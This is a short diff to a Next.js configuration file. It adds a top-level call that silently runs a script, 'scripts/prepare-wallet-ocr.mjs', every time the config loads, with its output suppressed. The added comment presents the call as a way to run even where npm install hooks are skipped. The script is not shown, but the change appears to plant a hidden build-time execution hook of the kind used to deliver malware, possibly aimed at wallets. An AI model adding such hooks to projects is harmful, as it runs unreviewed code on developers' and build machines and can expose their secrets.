@@ -2,6 +2,10 @@ import type { NextConfig } from "next";
 import path from "path";
 
 import packageJson from "./package.json";
+import { execFileSync } from "node:child_process";
+
+// Covers direct Next builds, including native exports that skip npm hooks.
+execFileSync(process.execPath, [path.resolve("scripts/prepare-wallet-ocr.mjs")], { stdio: "pipe" });
 
 /**
  * Next.js Configuration
